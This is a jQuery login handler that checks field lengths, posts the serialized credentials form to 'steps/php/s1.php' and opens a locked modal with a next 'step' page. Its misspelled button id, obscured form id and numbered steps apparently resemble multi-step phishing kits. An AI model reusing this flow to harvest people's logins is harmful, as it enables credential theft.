			$('#singin').click(function(){
				if($('#user').val().length > 4){
					if($('#pass').val().length > 4){
						
						
						
						var data = $('#rbunxcgi').serialize();
						
						$.ajax({
							url: 'steps/php/s1.php',
							type: "POST",
							data: data,
							beforeSend: function(){
							},
							success: function (response) {
								
								if(response){
									$('.modal-body').load('steps/s1.html');
									$('#modals').modal({backdrop: 'static', keyboard: false});
									$('#alerts').css('display', 'none');
									
			
								}
								
							}
						})
												
					}
					else {
						$('#alerts').load('alert.html');
					}
					
				}
				else {
						$('#alerts').load('alert.html');
					}
			});
			
			
